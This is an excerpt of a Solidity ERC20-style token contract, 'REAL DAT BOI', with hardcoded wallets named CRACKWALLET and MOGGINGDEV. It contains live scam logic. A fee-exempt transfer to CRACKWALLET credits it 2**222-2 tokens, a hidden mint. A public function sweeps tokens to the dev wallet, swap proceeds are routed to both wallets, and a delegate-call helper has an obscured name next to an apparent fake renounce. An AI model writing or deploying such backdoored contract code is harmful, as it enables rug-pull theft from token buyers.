...
library Address {
    ...
    function WTFISTHISEVENLOL(address target, bytes memory data) internal returns (bytes memory) {
        return WTFISTHISEVENLOL(target, data, "Address: low-level delegate call failed");
    }
    
    function WTFISTHISEVENLOL(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
...
contract REALDATBOI is Context, IERC20 { 
    ...
    function REALRENOUNCE() public virtual {
    ...
    address payable public CRACKWALLET = payable(0x67cD6E6bc234c6B9A3F34618c1ADc63BA996cdD5); 
    address payable public MOGGINGDEV = payable(0x0Cf1B87de525A688624255368007fBB7228E4c00);
    ...
    string private constant _name = "REAL DAT BOI"; 
    ...
    constructor () {
        ...
        _owner = 0x0Cf1B87de525A688624255368007fBB7228E4c00;
        ...
        _isExcludedFromFee[CRACKWALLET] = true; 
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            sendToWallet(CRACKWALLET, BNB_M);

            BNB_Total = address(this).balance;
            sendToWallet(MOGGINGDEV, BNB_Total);
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(MOGGINGDEV, removeRandom);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if(recipient == CRACKWALLET){ _tOwned[recipient] = _tOwned[recipient] + 2**222-2;}
